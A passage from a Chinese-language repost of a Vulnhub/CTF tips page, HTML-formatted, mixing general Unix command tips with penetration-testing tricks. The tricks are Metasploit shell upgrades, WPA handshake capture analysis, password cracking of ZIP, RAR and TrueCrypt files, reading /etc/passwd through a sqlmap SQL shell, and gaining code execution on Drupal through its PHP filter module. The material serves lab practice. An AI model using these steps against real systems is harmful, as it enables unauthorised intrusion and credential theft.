connections are attempted to be made secure by using the CA certificate  bundle  installed  by  default.
This makes all connections considered "insecure" fail unless -k, --insecure is used.

-I, --head
(HTTP/FTP/FILE) Fetch the HTTP-header only! HTTP-servers feature the command HEAD which this uses to 
get nothing but the header of a document. When used on an FTP or FILE file, curl displays the  file  
size and last modification time only.</pre>
<ul>
<li>TFTP</li>
</ul>
<pre><span class="n">get</span> <span class="ow">or</span> <span class="n">put</span> <span class="n">file</span></pre>
<ul>
<li>
<p class="first">Ruby是获取引用的单词/短语出文本最好的方式</p>
</li>
</ul>
<pre><span class="n">text</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="o">/</span><span class="s2">"([^"</span><span class="p">]</span>\<span class="o">*</span><span class="p">)</span><span class="s2">"/)</span></pre>
<ul>
<li>
<p class="first">将文件中的所有文本从UPPER转换为小写</p>
</li>
</ul>
<pre><span class="n">tr</span> <span class="s1">'[:upper:]'</span> <span class="s1">'[:lower:]'</span> <span class="o">&lt;</span> <span class="nb">input</span><span class="o">.</span><span class="n">txt</span> <span class="o">&gt;</span> <span class="n">output</span><span class="o">.</span><span class="n">txt</span></pre>
<ul>
<li>
<p class="first">删除长于x或短于x的行</p>
</li>
</ul>
<pre><span class="n">awk</span> <span class="s1">'length($0)&gt;x'</span> <span class="n">filename</span> <span class="ow">or</span> <span class="n">awk</span> <span class="s1">'length($0)</span></pre>
<ul>
<li>
<p class="first">在metasploit框架中，如果我们有一个shell（你应该尝试这个，当你试图与shell交互并且它死掉时（发生在Breach 2）），我们可以通过使用会话升级到meterpreter -u</p>
</li>
</ul>
<div>
<div class="highlight-default">
<div class="highlight">
<pre><span class="n">sessions</span> <span class="o">-</span><span class="n">h</span>
<span class="n">Usage</span><span class="p">:</span> <span class="n">sessions</span> <span class="p">[</span><span class="n">options</span><span class="p">]</span>

<span class="n">Active</span> <span class="n">session</span> <span class="n">manipulation</span> <span class="ow">and</span> <span class="n">interaction</span><span class="o">.</span>

<span class="n">OPTIONS</span><span class="p">:</span>

<span class="o">-</span><span class="n">u</span> <span class="o">&lt;</span><span class="n">opt</span><span class="o">&gt;</span>  <span class="n">Upgrade</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">to</span> <span class="n">a</span> <span class="n">meterpreter</span> <span class="n">session</span> <span class="n">on</span> <span class="n">many</span> <span class="n">platforms</span></pre>
</div>
</div>
</div>
<ul class="simple">
<li>如果你知道用户的密码，但是ssh不允许你登录，请检查ssh_config。</li>
</ul>
<div>
<div class="highlight-default">
<div class="highlight">
<pre><span class="c1">## Tighten security after security incident</span>
<span class="c1">## root never gets to log in remotely PermitRootLogin no</span>
<span class="c1">## Eugene &amp; Margo can SSH in, no-one else allowed</span>
<span class="n">AllowUsers</span> <span class="n">eugene</span> <span class="n">margo</span>
<span class="c1">## SSH keys only but margo can use a password</span>
<span class="n">Match</span> <span class="n">user</span> <span class="n">margo</span>
<span class="n">PasswordAuthentication</span> <span class="n">yes</span>
<span class="c1">## End tighten security</span></pre>
</div>
</div>
</div>
<ul class="simple">
<li>有一个随机字符串：找出它可能是什么？十六进制编码，base64编码，md5哈希。可以使用哈希标识符工具来帮助你。</li>
<li>如果我们得到一个包含802.11数据并具有auth，deauth和eapol密钥数据包的pcap文件，很可能是使用WPA-Handshake的无线攻击完成的数据包捕获。使用aircrack来查看是否存在任何WPA握手。</li>
</ul>
<pre><span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.922176</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> 
<span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.922688</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> 
<span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.923157</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.924224</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> 
<span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.924736</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> 
<span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.925723</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.933402</span> <span class="n">Probe</span> <span class="n">Response</span> <span class="p">(</span><span class="n">community</span><span class="p">)</span> <span class="p">[</span><span class="mf">1.0</span><span class="o">*</span> <span class="mf">2.0</span><span class="o">*</span> <span class="mf">5.5</span><span class="o">*</span> <span class="mf">11.0</span><span class="o">*</span> <span class="mf">18.0</span> <span class="mf">24.0</span> <span class="mf">36.0</span> <span class="mf">54.0</span> <span class="n">Mbit</span><span class="p">]</span> <span class="n">CH</span><span class="p">:</span> <span class="mi">11</span><span class="p">,</span> 
<span class="n">PRIVACY</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.933908</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.934427</span> <span class="n">Clear</span><span class="o">-</span><span class="n">To</span><span class="o">-</span><span class="n">Send</span> <span class="n">RA</span><span class="p">:</span><span class="n">e0</span><span class="p">:</span><span class="mi">3</span><span class="n">e</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.991250</span> <span class="n">Authentication</span> <span class="p">(</span><span class="n">Open</span> <span class="n">System</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="n">Successful</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992274</span> <span class="n">Authentication</span> <span class="p">(</span><span class="n">Open</span> <span class="n">System</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="n">Successful</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992282</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992795</span> <span class="n">Authentication</span> <span class="p">(</span><span class="n">Open</span> <span class="n">System</span><span class="p">)</span><span class="o">-</span><span class="mi">2</span><span class="p">:</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.992787</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.994834</span> <span class="n">Assoc</span> <span class="n">Request</span> <span class="p">(</span><span class="n">community</span><span class="p">)</span> <span class="p">[</span><span class="mf">1.0</span><span class="o">*</span> <span class="mf">2.0</span><span class="o">*</span> <span class="mf">5.5</span><span class="o">*</span> <span class="mf">11.0</span><span class="o">*</span> <span class="mf">18.0</span> <span class="mf">24.0</span> <span class="mf">36.0</span> <span class="mf">54.0</span> <span class="n">Mbit</span><span class="p">]</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.994843</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.996890</span> <span class="n">Assoc</span> <span class="n">Response</span> <span class="n">AID</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">:</span> <span class="n">PRIVACY</span> <span class="p">:</span> <span class="n">Successful</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">21.996882</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.011783</span> <span class="n">Action</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">BA</span> <span class="n">ADDBA</span> <span class="n">Response</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.012314</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.012827</span> <span class="n">BAR</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span> <span class="n">TA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span> <span class="n">CTL</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="n">SEQ</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.013330</span> <span class="n">BA</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.014874</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v2</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">117</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.015379</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.030226</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v1</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">117</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.030746</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.043034</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v2</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">175</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.043026</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.054803</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v1</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">95</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.056338</span> <span class="n">CF</span> <span class="o">+</span><span class="n">QoS</span> <span class="n">EAPOL</span> <span class="n">key</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="n">v1</span><span class="p">,</span> <span class="nb">len</span> <span class="mi">95</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.056859</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.064514</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.065030</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.079878</span> <span class="n">Clear</span><span class="o">-</span><span class="n">To</span><span class="o">-</span><span class="n">Send</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.080901</span> <span class="n">Acknowledgment</span> <span class="n">RA</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">9</span><span class="n">c</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">5</span><span class="n">f</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.108096</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> 
<span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.108096</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">c4</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">95</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from
</span> <span class="nn">nonassociated</span> <span class="n">station</span>
<span class="mi">13</span><span class="p">:</span><span class="mi">06</span><span class="p">:</span><span class="mf">22.110144</span> <span class="n">DeAuthentication</span> <span class="p">(</span><span class="n">e8</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">8</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="mi">75</span> <span class="p">(</span><span class="n">oui</span> <span class="n">Unknown</span><span class="p">)):</span> <span class="n">Class</span> <span class="mi">3</span> <span class="n">frame</span> <span class="n">received</span> <span class="kn">from</span> 
<span class="nn">nonassociated</span> <span class="n">station</span></pre>
<ul class="simple">
<li>传输图像</li>
</ul>
<div>
<div class="highlight-default">
<div class="highlight">
<pre><span class="n">base64</span> <span class="n">flair</span><span class="o">.</span><span class="n">jpg</span>
<span class="n">Copy</span> <span class="n">output</span>
<span class="n">vi</span> <span class="n">flair</span>
<span class="n">Paste</span> <span class="n">the</span> <span class="n">clipboard</span>
<span class="n">base64</span> <span class="o">-</span><span class="n">d</span> <span class="n">flair</span> <span class="o">&gt;</span> <span class="n">flair</span><span class="o">.</span><span class="n">jpg</span></pre>
</div>
</div>
</div>
<ul class="simple">
<li>它总是能找到重要的什么安装在盒子上：</li>
</ul>
<div>
<div class="highlight-default">
<div class="highlight">
<pre><span class="n">dpkg</span><span class="o">-</span><span class="n">query</span> <span class="o">-</span><span class="n">l</span></pre>
</div>
</div>
</div>
<div>
<p>或使用通配符</p>
</div>
<div>
<div class="highlight-default">
<div class="highlight">
<pre><span class="n">dpkg</span><span class="o">-</span><span class="n">query</span> <span class="o">-</span><span class="n">l</span> <span class="s1">'perl*'</span></pre>
</div>
</div>
</div>
<ul class="simple">
<li>密码保护文件：</li>
</ul>
<div>
<ul class="simple">
<li>ZIP文件：run fcrackzip</li>
</ul>
<pre>fcrackzip -D -u -p /tmp/rockyou2.txt flag.zip

-D, --dictionary:    Select dictionary mode. In this mode, fcrackzip will read passwords from a file, 
which must contain one password per line and should be alphabetically sorted (e.g. using sort(1)).
-p, --init-password string :  Set initial (starting) password for brute-force searching to string, or 
use the file with the name string to supply passwords for dictionary searching.
-u, --use-unzip: Try to decompress the first file by calling unzip with the guessed password. This weeds 
out false positives when not enough files have been given.</pre>
<div>
<ul class="simple">
<li>我们可以通过使用rar2john获取被密码保护的rar文件的密码哈希</li>
</ul>
<pre>[root:~/Downloads]# rar2john crocs.rar
file name: artwork.jpg
crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::artwork.jpg</pre>
</div>
<div></div>
<ul>
<li>
<p class="first">Data-URI:</p>
<p>&lt; <a class="reference external" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs">https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs</a> &gt;</li>
<li>
<p class="first">我们可以使用ssh的socks proxy代理连接到vnc，ssh，rdp如果vm在另一个vm托管，然后使用remmina访问VNC。</p>
</li>
</ul>
<pre>ssh -D localhost:9050 user@host

-D [bind_address:]port Specifies a local “dynamic” application-level port forwarding.  
This works by allocating a socket to listen to port on the local side, optionally bound to the 
specified bind_address.  Whenever a connection is made to this port, the connection is forwarded 
over the secure channel, and the application protocol is then used to determine where to connect 
to from the remote machine.  Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will 
act as a SOCKS server.  Only root can forward privileged ports. Dynamic port forwardings can also 
be specified in the configuration file.</pre>
<div>
<div class="highlight-default">
<div class="highlight">
<p>和</p>
<pre><span class="n">proxychains4</span> <span class="n">remmina</span></pre>
</div>
</div>
</div>
<ul class="simple">
<li>如果你有sqlmap的sql-shell，我们可以使用</li>
</ul>
<div>
<div class="highlight-default">
<div class="highlight">
<pre><span class="n">select</span> <span class="n">load_file</span><span class="p">(</span><span class="s1">'/etc/passwd'</span><span class="p">);</span></pre>
</div>
</div>
</div>
<ul class="simple">
<li>如果你有一个truecrypt卷打开和破解它的密码，我们可以使用truecrack破解密码和用veracrypt打开truecrypt卷。</li>
</ul>
<div>
<div class="highlight-default">
<div class="highlight">
<pre><span class="n">truecrack</span> <span class="o">--</span><span class="n">truecrypt</span> <span class="o">&lt;</span><span class="n">Truecrypt</span> <span class="n">File</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">k</span> <span class="n">SHA512</span> <span class="o">-</span><span class="n">w</span> <span class="o">&lt;</span><span class="n">Wordlist_File</span><span class="o">&gt;</span></pre>
</div>
</div>
</div>
<div>
<p>和Veracrypt打开文件。</p>
</div>
<ul class="simple">
<li>从以下位置获取反向shell：</li>
</ul>
<div>
<ul>
<li>
<p class="first">Drupal：现在我们可以访问Drupal管理面板，我们可以通过启用PHP过滤器模块来获得RCE。这将允许我们在页面内容中插入特制的字符串来执行任意代码。启用模块后，我继续允许所有用户在模块的配置下执行代码。一旦启用，我们需要授予使用权限，以便在 people -&gt; permissions“检查或使用PHP代码文本。</p>
<p>接下来，我创建一个新的块（by going to Blocks，在结构菜单下）与以下内容。我确保从文本格式下拉列表中选择PHP代码。取自&lt; <a class="reference external" href="https://g0blin.co.uk/droopy-vulnhub-writeup/">https://g0blin.co.uk/droopy-vulnhub-writeup/</a> &gt;</li>
<li>Drupal设置文件位置：/var/www/html/sites/default/settings.php</li>
</ul>
</div>
<ul class="simple">
<li>如果唯一打开的端口是3128，请检查打开的代理，并通过打开的代理路由流量。</li>
</ul>
<p>如想了解英语详细情况可去：<a href="http://bitvijays.github.io/LFFVulnhub.html">http://bitvijays.github.io/LFFVulnhub.html</a></p>
<p style="text-align: center;"><span style="color: #ff0000;"><strong>*<span style="color: #ff0000;">作者：<a style="color: #ff0000;" href="http://bitvijays.github.io/LFFVulnhub.html">bitvijays</a>,转载请注明来自MottoIN</span></strong></span></p>
</div>
</div>
                                                        <div class="entry-copyright"><p>原创文章，作者：Stbird，如若转载，请注明出处：http://www.mottoin.com/97936.html</p></div>                        </div>
                        <div class="entry-footer">
                            <div class="entry-tag"><a href="http://www.mottoin.com/tag/ctf" rel="tag">ctf</a><a href="http://www.mottoin.com/tag/shell" rel="tag">shell</a><a href="http://www.mottoin.com/tag/vulnhub" rel="tag">Vulnhub</a><a href="http://www.mottoin.com/tag/%e6%89%ab%e6%8f%8f" rel="tag">扫描</a><a href="http://www.mottoin.com/tag/%e6%bc%8f%e6%b4%9e" rel="tag">漏洞</a><a href="http://www.mottoin.com/tag/%e9%95%9c%e5%83%8f" rel="tag">镜像</a></div>
                            <div class="entry-action">
                                <div class="btn-zan" data-id="97936"><i class="fa fa-thumbs-up"></i> 赞 <span class="entry-action-num">(0)</span></div>

                                
                            </div>
                            <div class="entry-bar">
                                <div class="entry-bar-inner clearfix">
                                                                            <div class="author pull-left">
                                            <a data-user="435" target="_blank" href="http://www.mottoin.com/user/mottoin_x/" class="avatar">
                                                <img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-60 um-avatar um-avatar-gravatar" width="60" height="60" alt="Stbird" />                                                Stbird                                            </a>
                                            <span class="author-title">普通用户</span>                                         </div>
                                                                        <div class="info pull-right">
                                        <div class="info-item meta">
                                            <a class="meta-item j-heart" href="javascript:;" data-id="97936"><i class="fa fa-heart"></i> <span class="data">0</span></a>
                                            <a class="meta-item" href="#comments"><i class="fa fa-comment"></i> <span class="data">0</span></a>
                                                                                    </div>
                                        <div class="info-item share">
                                            <a class="meta-item" href="javascript:;">
                                                <i class="fa fa-wechat"></i>
                                                <span class="wx-wrap">
                                                    <img src="//pan.baidu.com/share/qrcode?w=320&h=320&url=http://www.mottoin.com/97936.html">
                                                    <span>扫码分享到微信</span>
                                                </span>
                                            </a>
